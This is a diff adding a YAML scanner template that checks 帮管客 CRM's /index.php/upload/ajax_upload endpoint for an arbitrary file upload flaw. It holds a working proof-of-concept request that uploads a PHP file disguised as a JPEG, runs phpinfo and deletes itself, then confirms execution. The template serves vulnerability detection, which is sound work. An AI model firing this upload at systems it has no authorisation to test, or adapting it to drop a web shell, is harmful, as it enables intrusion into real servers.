@@ -1,0 +1,36 @@
+id: bangguanke-crm-ajax-upload-fileupload
+
+info:
+  name: 帮管客CRM客户管理系统-/index.php/upload/ajax_upload接口存在任意文件上传漏洞
+  author: water
+  severity: critical
+  verified: true
+  description: |-
+    帮管客CRM客户管理系统-/index.php/upload/ajax_upload接口存在任意文件上传漏洞
+  tags: bangguanke,fileupload
+  created: 2025/06/16
+
+set:
+  rboundary: randomLowercase(8)
+  randname: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php/upload/ajax_upload
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo();unlink(__FILE__);\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+    expression: |
+      response.status == 302 &&
+      response.body.bcontains(b'\\u4e0a\\u4f20\\u6210\\u529f')
+    output:
+      search: '"\"url\":\"(?P<dir>.+?)\"".bsubmatch(response.body)'
+      dir: replaceAll(search["dir"],"\\","")
+
+  r1:
+    request:
+      method: GET
+      path: "{{dir}}"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version')
+expression: r0() && r1()
